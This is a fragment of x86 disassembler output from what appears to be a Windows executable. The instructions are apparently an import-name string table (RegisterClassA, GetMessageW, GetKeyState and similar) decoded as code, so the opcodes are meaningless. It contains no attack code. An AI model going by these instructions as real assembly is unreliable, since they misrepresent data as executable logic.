  413cc5:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  413cce:	popa   
  413ccf:	jae    0x413d44
  413cd1:	inc    ecx
  413cd2:	add    BYTE PTR [eax],al
  413cd4:	add    dl,BYTE PTR ds:[ebx+0x65]
  413cd8:	je     0x413d1e
  413cda:	ins    BYTE PTR es:[edi],dx
  413cdb:	addr16 dec ecx
  413cdd:	je     0x413d44
  413cdf:	ins    DWORD PTR es:[edi],dx
  413ce0:	push   esp
  413ce1:	gs js  0x413d58
  413ce4:	inc    ecx
  413ce5:	add    BYTE PTR [ebp+0x61724400],dh
  413ceb:	ja     0x413d3a
  413ced:	outs   dx,BYTE PTR gs:[esi]
  413cef:	jne    0x413d33
  413cf1:	popa   
  413cf2:	jb     0x413cf4
  413cf4:	sub    eax,DWORD PTR [ecx]
  413cf6:	inc    edi
  413cf7:	gs je  0x413d47
  413cfa:	outs   dx,BYTE PTR gs:[esi]
  413cfc:	jne    0x413cfe
  413cfe:	repnz add DWORD PTR [eax+0x6f],edx
  413d02:	jae    0x413d78
  413d04:	dec    ebp
  413d05:	gs jae 0x413d7b
  413d08:	popa   
  413d09:	addr16 gs push edi
  413d0c:	add    BYTE PTR [eax],al
  413d0e:	push   cs
  413d0f:	add    DWORD PTR [edi+0x65],eax
  413d12:	je     0x413d58
  413d14:	ins    BYTE PTR es:[edi],dx
  413d15:	addr16 inc ebx
  413d17:	je     0x413d8b
  413d19:	ins    BYTE PTR es:[edi],dx
  413d1a:	dec    ecx
  413d1b:	inc    esp
  413d1c:	add    BYTE PTR [eax],al
  413d1e:	mov    cl,0x2
  413d20:	push   esi
  413d21:	imul   ecx,DWORD PTR [ebx+0x65],0x79
  413d25:	push   ebx
  413d26:	arpl   WORD PTR [ecx+0x6e],sp
  413d29:	push   edi
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	sbb    BYTE PTR [ecx],al
  413d2e:	inc    edi
  413d2f:	gs je  0x413d7b
  413d32:	arpl   WORD PTR [edi+0x6e],bp
  413d35:	dec    ecx
  413d36:	outs   dx,BYTE PTR ds:[esi]
  413d37:	outs   dx,WORD PTR ds:[esi]
  413d39:	add    cl,cl
  413d3b:	add    DWORD PTR [ebp+0x61],ecx
  413d3e:	jo     0x413d97
  413d40:	imul   ebp,DWORD PTR [esi+0x64],0x6f50776f
  413d47:	imul   ebp,DWORD PTR [esi+0x74],0x2d0073
  413d4e:	inc    ebx
  413d4f:	push   0x654e7261
  413d54:	js     0x413dca
  413d56:	push   edi
  413d57:	add    BYTE PTR [ecx],ch
  413d59:	add    dl,BYTE PTR [ebx+0x65]
  413d5c:	outs   dx,BYTE PTR ds:[esi]
  413d5d:	fs dec ebp
  413d5f:	gs jae 0x413dd5
  413d62:	popa   
  413d63:	addr16 gs push esp
  413d66:	imul   ebp,DWORD PTR [ebp+0x65],0x4174756f
  413d6d:	add    BYTE PTR [eax],ch
  413d6f:	add    BYTE PTR [ebx+0x68],al
  413d72:	popa   
  413d73:	jb     0x413dc1
  413d75:	outs   dx,DWORD PTR ds:[esi]
  413d76:	ja     0x413ddd
  413d78:	jb     0x413dbc
  413d7a:	jne    0x413de2
  413d7c:	push   di
  413d7e:	add    BYTE PTR [eax],al
  413d80:	ins    DWORD PTR es:[edi],dx
  413d81:	add    DWORD PTR [edi+0x65],eax
  413d84:	je     0x413ddd
  413d86:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  413d8d:	outs   dx,BYTE PTR ds:[esi]
  413d8e:	addr16 push edi
  413d90:	add    BYTE PTR [eax],al
  413d92:	mov    bh,0x2
  413d94:	push   edi
  413d95:	popa   
  413d96:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  413d9e:	jne    0x413e14
  413da0:	dec    ecx
  413da1:	fs ins BYTE PTR es:[edi],dx
  413da3:	add    BYTE PTR gs:[eax],al
  413da6:	mov    DWORD PTR [ecx],0x5670614d
  413dac:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413db3:	gs jns 0x413dfb
  413db6:	js     0x413e0f
  413db8:	add    BYTE PTR [eax],al
  413dba:	cmp    eax,0x65684300
  413dbf:	arpl   WORD PTR [ebx+0x52],bp
  413dc2:	popa   
  413dc3:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  413dcb:	outs   dx,BYTE PTR ds:[esi]
  413dcc:	add    BYTE PTR [eax],al
  413dce:	add    eax,0x6c6c4100
  413dd3:	outs   dx,DWORD PTR ds:[esi]
  413dd4:	ja     0x413e29
  413dd6:	gs je  0x413e1f
  413dd9:	outs   dx,DWORD PTR ds:[esi]
  413dda:	jb     0x413e41
  413ddc:	addr16 jb 0x413e4e
  413ddf:	jne    0x413e4f
  413de1:	fs push edi
  413de3:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413dea:	into   
  413deb:	add    DWORD PTR [ebp+0x65],ecx
  413dee:	jae    0x413e63
  413df0:	popa   
  413df1:	addr16 gs inc edx
  413df4:	outs   dx,DWORD PTR ds:[esi]
  413df5:	js     0x413e38
  413df7:	add    BYTE PTR [edx],bh
  413df9:	add    DWORD PTR [edi+0x65],eax
  413dfc:	je     0x413e4b
  413dfe:	gs jae 0x413e74
  413e01:	popa   
  413e02:	addr16 gs inc ecx
  413e05:	add    BYTE PTR [edx+0x2],cl
  413e08:	push   ebx
  413e09:	gs je  0x413e59
  413e0c:	outs   dx,BYTE PTR gs:[esi]
  413e0e:	jne    0x413e54
  413e10:	gs popaw 
  413e13:	jne    0x413e81
  413e15:	je     0x413e60
  413e17:	je     0x413e7e
  413e19:	ins    DWORD PTR es:[edi],dx
  413e1a:	add    BYTE PTR [eax],al
  413e1c:	aad    0x1
  413e1e:	dec    ebp
  413e1f:	gs jae 0x413e95
  413e22:	popa   
  413e23:	addr16 gs inc edx
  413e26:	outs   dx,DWORD PTR ds:[esi]
  413e27:	js     0x413e80
  413e29:	add    BYTE PTR [ecx],bh
  413e2b:	add    DWORD PTR [edi+0x65],eax
  413e2e:	je     0x413e7d
  413e30:	outs   dx,BYTE PTR gs:[esi]
  413e32:	jne    0x413e87
  413e34:	je     0x413ea8
  413e36:	imul   ebp,DWORD PTR [esi+0x67],0xb9000057
  413e3d:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  413e41:	fs dec ebp
  413e43:	outs   dx,BYTE PTR gs:[esi]
  413e45:	jne    0x413e9e
  413e47:	add    BYTE PTR [ecx+eax*1+0x47],bl
  413e4b:	gs je  0x413ea1
  413e4e:	jns    0x413ec3
  413e50:	je     0x413eb7
  413e52:	ins    DWORD PTR es:[edi],dx
  413e53:	dec    ebp
  413e54:	gs je  0x413ec9
  413e57:	imul   esp,DWORD PTR [ebx+0x73],0x2260000
  413e5e:	push   ebx
  413e5f:	outs   dx,BYTE PTR gs:[esi]
  413e61:	fs dec ebp
  413e63:	gs jae 0x413ed9
  413e66:	popa   
  413e67:	addr16 gs inc ecx
  413e6a:	add    BYTE PTR [eax],al
  413e6c:	aaa    
  413e6d:	add    DWORD PTR [edi+0x65],eax
  413e70:	je     0x413ebf
  413e72:	outs   dx,BYTE PTR gs:[esi]
  413e74:	jne    0x413ec9
  413e76:	je     0x413ed9
  413e78:	je     0x413edf
  413e7a:	add    BYTE PTR [eax],al
  413e7c:	mov    bl,0x0
  413e7e:	inc    esp
  413e7f:	jb     0x413ee2
  413e81:	ja     0x413ecc
  413e83:	arpl   WORD PTR [edi+0x6e],bp
  413e86:	add    BYTE PTR [eax],al
  413e88:	xchg   ebp,eax
  413e89:	add    BYTE PTR [ebp+eiz*2+0x73],al
  413e8d:	je     0x413f01
  413e8f:	outs   dx,DWORD PTR ds:[esi]
  413e90:	jns    0x413ed5
  413e92:	jne    0x413f06
  413e94:	jae    0x413f05
  413e96:	jb     0x413e98
  413e98:	add    al,BYTE PTR [eax]
  413e9a:	inc    ecx
  413e9b:	fs push 0x75
  413e9e:	jae    0x413f14
  413ea0:	push   edi
  413ea1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  413ea8:	arpl   WORD PTR [eax+eax*1+0x0],si
  413eac:	pop    ecx
  413ead:	add    DWORD PTR [edi+0x65],eax
  413eb0:	je     0x413f05
  413eb2:	jns    0x413f27
  413eb4:	inc    ebx
  413eb5:	outs   dx,DWORD PTR ds:[esi]
  413eb6:	ins    BYTE PTR es:[edi],dx
  413eb7:	outs   dx,DWORD PTR ds:[esi]
  413eb8:	jb     0x413eba
  413eba:	jle    0x413ebd
  413ebc:	dec    eax
  413ebd:	imul   ebp,DWORD PTR [ecx+ebp*2+0x74],0x6e654d65
  413ec5:	jne    0x413f10
  413ec7:	je     0x413f2e
  413ec9:	ins    DWORD PTR es:[edi],dx
  413eca:	add    BYTE PTR [eax],al
  413ecc:	or     DWORD PTR [eax],eax
  413ece:	inc    ecx
  413ecf:	jo     0x413f41
  413ed1:	outs   dx,BYTE PTR gs:[esi]
  413ed3:	fs dec ebp
  413ed5:	outs   dx,BYTE PTR gs:[esi]
  413ed7:	jne    0x413f30
  413ed9:	add    BYTE PTR [eax+eax*1],bh
  413edc:	inc    ebx
  413edd:	push   0x4d6b6365
  413ee2:	outs   dx,BYTE PTR gs:[esi]
  413ee4:	jne    0x413f38
  413ee6:	popa   
  413ee7:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  413eef:	add    BYTE PTR [ecx+eax*1+0x64616f4c],bh
  413ef6:	push   ebx
  413ef7:	je     0x413f6b
  413ef9:	imul   ebp,DWORD PTR [esi+0x67],0x21f0057
  413f00:	push   ebx
  413f01:	arpl   WORD PTR [edx+0x6f],si
  413f04:	ins    BYTE PTR es:[edi],dx
  413f05:	ins    BYTE PTR es:[edi],dx
  413f06:	push   edi
  413f07:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f0e:	xor    DWORD PTR [eax],eax
  413f10:	inc    ebx
  413f11:	push   0x72507261
  413f16:	gs jbe 0x413f70
  413f19:	add    BYTE PTR [edi+0x2],bl
  413f1c:	push   ebx
  413f1d:	gs je  0x413f73
  413f20:	jns    0x413f95
  413f22:	inc    ebx
  413f23:	outs   dx,DWORD PTR ds:[esi]
  413f24:	ins    BYTE PTR es:[edi],dx
  413f25:	outs   dx,DWORD PTR ds:[esi]
  413f26:	jb     0x413f9b
  413f28:	add    BYTE PTR [eax],al
  413f2a:	sgdtd  [edi+0x65]
  413f2e:	je     0x413f74
  413f30:	ins    BYTE PTR es:[edi],dx
  413f31:	addr16 dec ecx
  413f33:	je     0x413f9a
  413f35:	ins    DWORD PTR es:[edi],dx
  413f36:	add    BYTE PTR [eax],al
  413f38:	dec    esp
  413f39:	add    dl,BYTE PTR [ebx+0x65]
  413f3c:	je     0x413f8b
  413f3e:	outs   dx,BYTE PTR gs:[esi]
  413f40:	jne    0x413f8b
  413f42:	je     0x413fa9
  413f44:	ins    DWORD PTR es:[edi],dx
  413f45:	inc    edx
  413f46:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x7370
  413f4e:	or     al,0x1
  413f50:	inc    edi
  413f51:	gs je  0x413f98
  413f54:	gs jae 0x413fc2
  413f57:	je     0x413fc8
  413f59:	jo     0x413fb2
  413f5b:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  413f62:	inc    ebp
  413f63:	add    DWORD PTR [edi+0x65],eax
  413f66:	je     0x413fb8
  413f68:	popa   
  413f69:	jb     0x413fd0
  413f6b:	outs   dx,BYTE PTR ds:[esi]
  413f6c:	je     0x413f6e
  413f6e:	mov    BYTE PTR [eax],0x45
  413f71:	outs   dx,BYTE PTR ds:[esi]
  413f72:	fs push esp
  413f74:	popa   
  413f75:	jae    0x413fe2
  413f77:	add    BYTE PTR [eax+0x0],ah
  413f7a:	inc    ebx
  413f7b:	jb     0x413fe2
  413f7d:	popa   
  413f7e:	je     0x413fe5
  413f80:	dec    ebp
  413f81:	outs   dx,BYTE PTR gs:[esi]
  413f83:	jne    0x413f85
  413f85:	add    bl,dh
  413f87:	add    BYTE PTR [edi+0x65],al
  413f8a:	je     0x413fcf
  413f8c:	popa   
  413f8d:	jb     0x413ff4
  413f8f:	je     0x413fe1
  413f91:	outs   dx,DWORD PTR ds:[esi]
  413f92:	jae    0x413f94
  413f94:	sub    eax,DWORD PTR [edx]
  413f96:	push   ebx
  413f97:	outs   dx,BYTE PTR gs:[esi]
  413f99:	fs dec ebp
  413f9b:	gs jae 0x414011
  413f9e:	popa   
  413f9f:	addr16 gs push edi
  413fa2:	add    BYTE PTR [eax],al
  413fa4:	test   DWORD PTR [ecx],eax
  413fa6:	dec    ecx
  413fa7:	outs   dx,BYTE PTR ds:[esi]
  413fa8:	jae    0x41400f
  413faa:	jb     0x414020
  413fac:	dec    ebp
  413fad:	outs   dx,BYTE PTR gs:[esi]
  413faf:	jne    0x413ffa
  413fb1:	je     0x414018
  413fb3:	ins    DWORD PTR es:[edi],dx
  413fb4:	push   edi
  413fb5:	add    BYTE PTR [ecx+0x0],ah
  413fb8:	inc    ebx
  413fb9:	jb     0x414020
  413fbb:	popa   
  413fbc:	je     0x414023
  413fbe:	push   eax
  413fbf:	outs   dx,DWORD PTR ds:[esi]
  413fc0:	jo     0x414037
  413fc2:	jo     0x414011
  413fc4:	outs   dx,BYTE PTR gs:[esi]
  413fc6:	jne    0x413fc8
  413fc8:	inc    eax
  413fc9:	add    DWORD PTR [edi+0x65],eax
  413fcc:	je     0x41401b
  413fce:	outs   dx,DWORD PTR ds:[esi]
  413fcf:	outs   dx,BYTE PTR ds:[esi]
  413fd0:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6f666e49
  413fd8:	push   edi
  413fd9:	add    al,cl
  413fdb:	add    DWORD PTR [ebp+0x61],ecx
  413fde:	jo     0x414036
  413fe0:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  413fe7:	gs jns 0x414041
  413fea:	add    BYTE PTR [eax],al
  413fec:	out    0x0,eax
  413fee:	inc    esi
  413fef:	jb     0x414052
  413ff1:	ins    DWORD PTR es:[edi],dx
  413ff2:	gs push edx
  413ff4:	arpl   WORD PTR gs:[eax+eax*1-0x41],si
  413ff9:	add    BYTE PTR [ebp+0x6e],al
  413ffc:	popa   
  413ffd:	bound  ebp,QWORD PTR [ebp+eiz*2+0x4d]
  414001:	outs   dx,BYTE PTR gs:[esi]
  414003:	jne    0x41404e
  414005:	je     0x41406c
  414007:	ins    DWORD PTR es:[edi],dx
  414008:	add    BYTE PTR [eax],al
  41400a:	fwait
  41400b:	add    dl,BYTE PTR [ebp+0x6e]
  41400e:	ins    BYTE PTR es:[edi],dx
  41400f:	outs   dx,DWORD PTR ds:[esi]
  414010:	popa   
  414011:	fs dec ebx
  414013:	gs jns 0x414078
  414016:	outs   dx,DWORD PTR ds:[esi]
  414017:	popa   
  414018:	jb     0x41407e
  41401a:	dec    esp
  41401b:	popa   
  41401c:	jns    0x41408d
  41401e:	jne    0x414094
  414020:	add    BYTE PTR [eax],al
  414022:	mov    esp,0x6e695702
  414027:	outs   dx,DWORD PTR fs:[esi]
  414029:	ja     0x414071
  41402b:	jb     0x41409c
  41402d:	ins    DWORD PTR es:[edi],dx
  41402e:	push   eax
  41402f:	outs   dx,DWORD PTR ds:[esi]
  414030:	imul   ebp,DWORD PTR [esi+0x74],0x4400ab00
  414037:	jb     0x41409a
  414039:	ja     0x41407c
  41403b:	outs   dx,BYTE PTR ds:[esi]
  41403c:	imul   ebp,DWORD PTR [ebp+0x61],0x52646574
  414043:	arpl   WORD PTR gs:[ebx+esi*2+0x0],si
  414048:	and    BYTE PTR [edx],al
  41404a:	push   ebx
  41404b:	arpl   WORD PTR [edx+0x6f],si
  41404e:	ins    BYTE PTR es:[edi],dx
  41404f:	ins    BYTE PTR es:[edi],dx
  414050:	push   edi
  414051:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  414058:	add    BYTE PTR [eax],al
  41405a:	pop    eax
  41405b:	add    dl,BYTE PTR [ebx+0x65]
  41405e:	je     0x4140b2
  414060:	arpl   WORD PTR gs:[eax+eax*1+0x3d],si
  414065:	add    dl,BYTE PTR [ebx+0x65]
  414068:	je     0x4140ae
  41406a:	ins    BYTE PTR es:[edi],dx
  41406b:	addr16 dec ecx
  41406d:	je     0x4140d4
  41406f:	ins    DWORD PTR es:[edi],dx
  414070:	dec    ecx
  414071:	outs   dx,BYTE PTR ds:[esi]
  414072:	je     0x414074
  414074:	or     eax,0x67654200
  414079:	imul   ebp,DWORD PTR [esi+0x50],0x746e6961
  414080:	add    BYTE PTR [eax],al
  414082:	pop    ebp
  414083:	add    BYTE PTR [ebx+0x72],al
  414086:	gs popa 
  414088:	je     0x4140ef
  41408a:	dec    ecx
  41408b:	arpl   WORD PTR [edi+0x6e],bp
  41408e:	dec    ecx
  41408f:	outs   dx,BYTE PTR ds:[esi]
  414090:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  414098:	dec    esi
  414099:	add    dl,BYTE PTR [ebx+0x65]
  41409c:	je     0x4140eb
  41409e:	outs   dx,BYTE PTR gs:[esi]
  4140a0:	jne    0x4140eb
  4140a2:	je     0x414109
  4140a4:	ins    DWORD PTR es:[edi],dx
  4140a5:	dec    ecx
  4140a6:	outs   dx,BYTE PTR ds:[esi]
  4140a7:	outs   dx,WORD PTR ds:[esi]
  4140a9:	push   edi
  4140aa:	add    BYTE PTR [eax],al
  4140ac:	pop    edx
  4140ad:	add    dl,BYTE PTR [ebx+0x65]
  4140b0:	je     0x414105
  4140b2:	arpl   WORD PTR [edx+0x6f],si
  4140b5:	ins    BYTE PTR es:[edi],dx
  4140b6:	ins    BYTE PTR es:[edi],dx
  4140b7:	dec    ecx
  4140b8:	outs   dx,BYTE PTR ds:[esi]
  4140b9:	outs   dx,WORD PTR ds:[esi]
  4140bb:	add    BYTE PTR [edx],dh
  4140bd:	add    BYTE PTR [ebx+0x68],al
  4140c0:	popa   
  4140c1:	jb     0x414117
  4140c3:	outs   dx,DWORD PTR ds:[esi]
  4140c4:	dec    edi
  4140c5:	gs ins DWORD PTR es:[edi],dx
  4140c7:	inc    ecx
  4140c8:	add    BYTE PTR [eax],al
  4140ca:	sub    eax,0x6e655302
  4140cf:	fs dec esi
  4140d1:	outs   dx,DWORD PTR ds:[esi]
  4140d2:	je     0x41413d
  4140d4:	data16 jns 0x414124
  4140d7:	gs jae 0x41414d
  4140da:	popa   
  4140db:	addr16 gs push edi
  4140de:	add    BYTE PTR [eax],al
  4140e0:	sti    
  4140e1:	add    BYTE PTR [edi+0x65],al
  4140e4:	je     0x414129
  4140e6:	ins    BYTE PTR es:[edi],dx
  4140e7:	popa   
  4140e8:	jae    0x41415d
  4140ea:	dec    esi
  4140eb:	popa   
  4140ec:	ins    DWORD PTR es:[edi],dx
  4140ed:	gs push edi
  4140ef:	add    BYTE PTR [ebx+0x61725402],dl
  4140f5:	outs   dx,BYTE PTR ds:[esi]
  4140f6:	jae    0x414164
  4140f8:	popa   
  4140f9:	je     0x414160
  4140fb:	inc    ecx
  4140fc:	arpl   WORD PTR [ebx+0x65],sp
  4140ff:	ins    BYTE PTR es:[edi],dx
  414100:	gs jb  0x414164
  414103:	je     0x414174
  414105:	jb     0x414148
  414107:	add    BYTE PTR [ebx+0x2],bh
  41410a:	push   ebx
  41410b:	push   0x7543776f
  414110:	jb     0x414185
  414112:	outs   dx,DWORD PTR ds:[esi]
  414113:	jb     0x414115
  414115:	add    BYTE PTR [ebx+0x2],dh
  414118:	push   ebx
  414119:	gs je  0x414173
  41411c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  414123:	js     0x414199
  414125:	inc    ecx
  414126:	add    BYTE PTR [eax],al
  414128:	add    BYTE PTR es:[ebx+0x68],al
  41412c:	popa   
  41412d:	jb     0x41417b
  41412f:	outs   dx,DWORD PTR ds:[esi]
  414130:	ja     0x414197
  414132:	jb     0x414175
  414134:	add    BYTE PTR [eax],al
  414136:	xchg   BYTE PTR [ecx],al
  414138:	dec    ecx
  414139:	outs   dx,BYTE PTR ds:[esi]
  41413a:	jae    0x4141a1
  41413c:	jb     0x4141b2
  41413e:	dec    ebp
  41413f:	outs   dx,BYTE PTR gs:[esi]
  414141:	jne    0x41419a
  414143:	add    BYTE PTR [eax],cl
  414145:	add    BYTE PTR [ecx+0x70],al
  414148:	jo     0x4141af
  41414a:	outs   dx,BYTE PTR ds:[esi]
  41414b:	fs dec ebp
  41414d:	outs   dx,BYTE PTR gs:[esi]
  41414f:	jne    0x414192
  414151:	add    BYTE PTR [edx+0x1],ch
  414154:	inc    edi
  414155:	gs je  0x4141af
  414158:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41415f:	add    BYTE PTR [ecx+0x2],bl
  414162:	push   ebx
  414163:	gs je  0x4141b8
  414166:	arpl   WORD PTR gs:[ebp+eax*2+0x6d],si
  41416b:	jo     0x4141e1
  41416d:	jns    0x41416f
  41416f:	add    BYTE PTR [edx+0x1],bl
  414172:	inc    edi
  414173:	gs je  0x4141c9
  414176:	jns    0x4141eb
  414178:	inc    ebx
  414179:	outs   dx,DWORD PTR ds:[esi]
  41417a:	ins    BYTE PTR es:[edi],dx
  41417b:	outs   dx,DWORD PTR ds:[esi]
  41417c:	jb     0x4141c0
  41417e:	jb     0x4141f5
  414180:	jae    0x4141ea
  414182:	add    BYTE PTR [eax],al
  414184:	jg     0x414188
  414186:	push   ebx
  414187:	push   0x6957776f
  41418c:	outs   dx,BYTE PTR ds:[esi]
  41418d:	outs   dx,DWORD PTR fs:[esi]
  41418f:	ja     0x414191
  414191:	add    BYTE PTR [eax+eax*1],ah
  414194:	inc    ebx
  414195:	push   0x65676e61
  41419a:	dec    ebp
  41419b:	outs   dx,BYTE PTR gs:[esi]
  41419d:	jne    0x4141f6
  41419f:	add    al,ah
  4141a1:	add    DWORD PTR [edi+0x65],ecx
  4141a4:	ins    DWORD PTR es:[edi],dx
  4141a5:	push   esp
  4141a6:	outs   dx,DWORD PTR ds:[esi]
  4141a7:	inc    ebx
  4141a8:	push   0x417261
  4141ad:	add    BYTE PTR [edi+0x43734901],cl
  4141b3:	push   0x6c417261
  4141b8:	jo     0x414222
  4141ba:	popa   
  4141bb:	push   edi
  4141bc:	add    BYTE PTR [eax],al
  4141be:	xchg   BYTE PTR [edx],al
  4141c0:	push   ebx
  4141c1:	jns    0x414236
  4141c3:	je     0x41422a
  4141c5:	ins    DWORD PTR es:[edi],dx
  4141c6:	push   eax
  4141c7:	popa   
  4141c8:	jb     0x41422b
  4141ca:	ins    DWORD PTR es:[edi],dx
  4141cb:	gs je  0x414233
  4141ce:	jb     0x414243
  4141d0:	dec    ecx
  4141d1:	outs   dx,BYTE PTR ds:[esi]
  4141d2:	outs   dx,WORD PTR ds:[esi]
  4141d4:	push   edi
  4141d5:	add    BYTE PTR ds:0x67655202,al
  4141db:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  4141e2:	popa   
  4141e3:	jae    0x414258
  4141e5:	push   edi
  4141e6:	add    BYTE PTR [eax],al
  4141e8:	add    BYTE PTR [edx],0x53
  4141eb:	push   0x6957776f
  4141f0:	outs   dx,BYTE PTR ds:[esi]
  4141f1:	outs   dx,DWORD PTR fs:[esi]
  4141f3:	ja     0x414236
  4141f5:	jae    0x414270
  4141f7:	outs   dx,BYTE PTR ds:[esi]
  4141f8:	arpl   WORD PTR [eax],ax
  4141fa:	mov    edi,0x70737702
  4141ff:	jb     0x41426a
  414201:	outs   dx,BYTE PTR ds:[esi]
  414202:	je     0x41426a
  414204:	inc    ecx
  414205:	add    BYTE PTR [esi+0x2],ch
  414208:	push   ebx
  414209:	gs je  0x414263
  41420c:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  414213:	outs   dx,BYTE PTR ds:[esi]
  414214:	addr16 push edi
  414216:	add    BYTE PTR [eax],al
  414218:	test   BYTE PTR [edx],al
  41421a:	push   ebx
  41421b:	ja     0x414286
  41421d:	je     0x414282
  41421f:	push   0x68546f54
  414224:	imul   esi,DWORD PTR [ebx+0x57],0x6f646e69
  41422b:	ja     0x41422d
  41422d:	add    al,al
  41422f:	add    dh,BYTE PTR [edi+0x73]
  414232:	jo     0x4142a6
  414234:	imul   ebp,DWORD PTR [esi+0x74],0x97005766
  41423b:	add    DWORD PTR [ecx+0x73],ecx
  41423e:	inc    esp
  41423f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  414246:	jae    0x4142bb
  414248:	popa   
  414249:	addr16 gs inc ecx
  41424c:	add    BYTE PTR [eax],al
  41424e:	daa    
  41424f:	add    DWORD PTR [edi+0x65],eax
  414252:	je     0x41429f
  414254:	gs jns 0x4142b9
  414257:	outs   dx,DWORD PTR ds:[esi]
  414258:	popa   
  414259:	jb     0x4142bf
  41425b:	push   esp
  41425c:	jns    0x4142ce
  41425e:	gs add bh,al
  414261:	add    BYTE PTR [ebp+0x6e],al
  414264:	jne    0x4142d3
  414266:	inc    ebx
  414267:	push   0x57646c69
  41426c:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  414273:	add    BYTE PTR [ebp+0x53],dl
  414276:	inc    ebp
  414277:	push   edx
  414278:	xor    esi,DWORD PTR [edx]
  41427a:	cs fs ins BYTE PTR es:[edi],dx
  41427d:	ins    BYTE PTR es:[edi],dx
  41427e:	add    BYTE PTR [eax],al
  414280:	lods   al,BYTE PTR ds:[esi]
  414281:	add    BYTE PTR [ebx+0x72],al
  414284:	gs popa 
  414286:	je     0x4142ed
  414288:	push   edx
  414289:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  41428e:	outs   dx,BYTE PTR ds:[esi]
  41428f:	dec    ecx
  414290:	outs   dx,BYTE PTR ds:[esi]
  414291:	imul   esi,DWORD PTR fs:[edx+0x65],0x89007463
  414299:	add    BYTE PTR [ebx+0x72],al
  41429c:	gs popa 
  41429e:	je     0x414305
  4142a0:	inc    edx
  4142a1:	jb     0x414318
  4142a3:	jae    0x41430d
  4142a5:	dec    ecx
  4142a6:	outs   dx,BYTE PTR ds:[esi]
  4142a7:	imul   esi,DWORD PTR fs:[edx+0x65],0xb7007463
  4142af:	add    DWORD PTR [eax+0x74],edx
  4142b2:	push   esi
  4142b3:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  4142ba:	iret   
  4142bb:	add    DWORD PTR [ebx+0x65],edx
  4142be:	ins    BYTE PTR es:[edi],dx
  4142bf:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  4142c4:	ins    BYTE PTR es:[edi],dx
  4142c5:	gs je  0x41433c
  4142c8:	add    BYTE PTR gs:[ebx+0x65724300],dl
  4142cf:	popa   
  4142d0:	je     0x414337
  4142d2:	inc    esp
  4142d3:	dec    ecx
  4142d4:	inc    edx
  4142d5:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xc4000070
  4142dd:	add    DWORD PTR [edx+0x65],edx
  4142e0:	jae    0x41434b
  4142e2:	jp     0x414349
  4142e4:	push   eax
  4142e5:	popa   
  4142e6:	ins    BYTE PTR es:[edi],dx
  4142e7:	gs je  0x41435e
  4142ea:	add    BYTE PTR gs:[ebp+0x766f4d01],bl
  4142f1:	gs push esp
  4142f3:	outs   dx,DWORD PTR ds:[esi]
  4142f4:	inc    ebp
  4142f5:	js     0x4142f7
  4142f7:	add    BYTE PTR [edx+0x65724300],bl
  4142fd:	popa   
  4142fe:	je     0x414365
  414300:	inc    esi
  414301:	outs   dx,DWORD PTR ds:[esi]
  414302:	outs   dx,BYTE PTR ds:[esi]
  414303:	je     0x41434e
  414305:	outs   dx,BYTE PTR ds:[esi]
  414306:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  41430e:	mov    esp,0x6c6c4500
  414313:	imul   esi,DWORD PTR [eax+0x73],0xb30065
  41431a:	inc    esp
  41431b:	gs ins BYTE PTR es:[edi],dx
  41431d:	gs je  0x414385
  414320:	inc    esp
  414321:	inc    ebx
  414322:	add    BYTE PTR [eax],al
  414324:	aad    0x0
  414326:	inc    ebp
  414327:	js     0x41439d
  414329:	push   esp
  41432a:	gs js  0x4143a1
  41432d:	dec    edi
  41432e:	jne    0x4143a4
  414330:	push   edi
  414331:	add    BYTE PTR [edi+0x65724300],al
  414337:	popa   
  414338:	je     0x41439f
  41433a:	inc    edx
  41433b:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xba000070
  414343:	add    DWORD PTR [edx+0x65],edx
  414346:	arpl   WORD PTR [esi+edx*2+0x69],si
  41434a:	jae    0x4143b5
  41434c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  414350:	int    0x0
  414352:	inc    ebp
  414353:	jae    0x4143b8
  414355:	popa   
  414356:	jo     0x4143bd
  414358:	add    BYTE PTR [eax],al
  41435a:	fadd   QWORD PTR [ecx]
  41435c:	push   ebx
  41435d:	gs je  0x4143a4
  414360:	dec    ecx
  414361:	inc    edx
  414362:	inc    ebx
  414363:	outs   dx,DWORD PTR ds:[esi]
  414364:	ins    BYTE PTR es:[edi],dx
  414365:	outs   dx,DWORD PTR ds:[esi]
  414366:	jb     0x4143bc
  414368:	popa   
  414369:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41436d:	add    BYTE PTR [ecx+0x66664f01],ah
  414373:	jae    0x4143da
  414375:	je     0x4143cd
  414377:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  41437e:	dec    edi
  41437f:	jb     0x4143e8
  414381:	inc    ebp
  414382:	js     0x414384
  414384:	and    DWORD PTR [ecx],eax
  414386:	inc    edi
  414387:	gs je  0x4143cc
  41438a:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  414392:	jae    0x414394
  414394:	mov    dh,0x0
  414396:	inc    esp
  414397:	gs ins BYTE PTR es:[edi],dx
  414399:	gs je  0x414401
